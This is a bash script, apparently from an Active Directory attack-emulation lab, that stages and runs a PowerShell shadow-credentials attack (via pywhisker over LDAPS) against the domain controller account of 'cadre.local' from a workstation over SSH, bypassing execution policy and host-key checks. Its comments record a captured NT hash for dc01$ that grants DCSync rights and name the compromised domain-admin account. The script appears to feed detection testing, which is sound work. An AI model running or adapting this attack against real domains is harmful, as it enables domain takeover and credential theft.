#!/usr/bin/env bash
# T008 — Shadow credentials on dc01$ from ws01 as chief_command (cadre.local DA) — VERIFIED
# Corrected 2026-07-31: pywhisker (explicit -u/-p creds, in-script) + LDAPS.
#   Whisker.exe / Start-Process -Credential fails in SSH session (0xC0000142);
#   pywhisker binds in-process with explicit creds — no scheduled task needed.
# Entry credential: chief_command (earned via Branch A T015 ForceChangePassword)
# Result: dc01$ NT hash 09493093db08c8afa99193779d401b34 (= DCSync rights)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T008-SHADOW-CREDS-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T008 Shadow credentials | ${CASE_ID} | T0=${T0} ==="

PS='C:\Tools\cadre-attack\t008-shadow-creds-dc01.ps1'

# Stage + run the verified in-script pywhisker implementation on ws01
scp -i "${WS01_KEY:-$HOME/.ssh/cadre-ws01-key}" -o StrictHostKeyChecking=no \
  "$SCRIPT_DIR/../../../windows/t008-shadow-creds-dc01.ps1" \
  "analyst_t1@192.168.77.62:C:/Tools/cadre-attack/" >/dev/null

ssh -i "${WS01_KEY:-$HOME/.ssh/cadre-ws01-key}" -o StrictHostKeyChecking=no \
  analyst_t1@192.168.77.62 \
  "powershell -NoProfile -ExecutionPolicy Bypass -File ${PS}" \
  | tee "/tmp/${CASE_ID}.out"

cadre_export "${CASE_ID}" T008 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T008 run complete ==="
